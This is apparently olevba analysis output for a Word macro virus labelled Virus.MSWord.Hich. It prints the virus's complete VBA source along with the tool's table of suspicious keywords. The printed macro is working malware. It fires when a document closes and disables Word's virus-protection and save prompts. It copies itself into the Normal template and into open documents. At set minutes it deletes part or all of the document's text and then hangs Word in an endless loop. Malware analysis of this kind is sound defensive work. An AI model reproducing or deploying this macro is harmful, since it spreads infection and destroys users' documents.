olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hich
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hich - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
    CIH
End Sub

Private Sub CIH()
    On Error Resume Next
    Dim StartLoc, ProcLen, Obj, Str, i, s, Lose
    s = ActiveDocument.Saved: Application.EnableCancelKey = 0
    With Options: .ConfirmConversions = 0: .VirusProtection = 0: .SaveNormalPrompt = 0: End With
    
    Set Obj = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
    StartLoc = Obj.ProcStartLine("CIH", 0): ProcLen = Obj.ProcCountLines("CIH", 0)
    Str = Obj.Lines(StartLoc, ProcLen)
    
    Set Obj = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    i = Empty: i = Obj.ProcStartLine("CIH", 0)
    If i <> Empty Then
        Set Obj = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        i = Empty: i = Obj.ProcStartLine("CIH", 0)
        If i <> Empty Then Obj = ""
    End If
    
    If Obj <> "" Then
        i = Empty: i = Obj.ProcStartLine("Document_Close", 0)
        If i = Empty Then
            Obj.InsertLines Obj.CountOfLines + 1, "Private Sub Document_Close()" & Chr(13) & "    CIH" & Chr(13) & "End Sub"
        Else
            Obj.InsertLines Obj.ProcStartLine("Document_Close", 0) + 1, "    CIH"
        End If
        Obj.InsertLines Obj.CountOfLines + 1, Str
    End If
    
    If Minute(Now) = 1 Then ActiveDocument.Range(ActiveDocument.Characters.Count / 2 * (1 - 0.1 * Rnd), ActiveDocument.Characters.Count / 2 * (1 + 0.1 * Rnd)) = ""
    If Minute(Now) = 26 Then ActiveDocument.Range(0, ActiveDocument.Characters.Count) = "": Lose = True
    If s = False Then ActiveDocument.Save
    If Lose = True And ActiveDocument.Saved Then Do: Loop
    ActiveDocument.Saved = True
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

